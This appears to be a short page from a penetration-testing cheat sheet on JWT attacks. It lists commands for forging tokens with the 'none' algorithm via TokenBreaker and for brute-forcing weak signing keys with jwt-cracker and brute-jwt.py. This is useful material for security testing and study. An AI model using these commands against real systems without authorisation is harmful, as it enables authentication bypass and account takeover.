---
layout: default
title: WEB Attacks
parent: Attacks
nav_order: 3
---

# WEB Attacks
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## JWT
Decode token:
* [https://jwt.io](https://jwt.io)

### "None" algorithm
Get [TokenBreaker](https://github.com/Goron/TokenBreaker)
```
python3 TheNone.py -t <token>
```

### Bruteforcing: Weak Signing Key 

#### JWT-Cracker
Get [jwt-cracker](https://github.com/lmammino/jwt-cracker)
```
jwt-cracker "<Token>" "abcdefghijklmnopqrstuwxyz" 6
```
```
jwt-cracker <Token> 1234567890 6
```
#### Brute-jwt
Get [brute-jwt.py](https://github.com/NotSoSecure/json_web_tokens)
```
python brute-jwt.py --file /usr/share/wordlists/secrets.txt --algorithm HS256 --token <Token>
```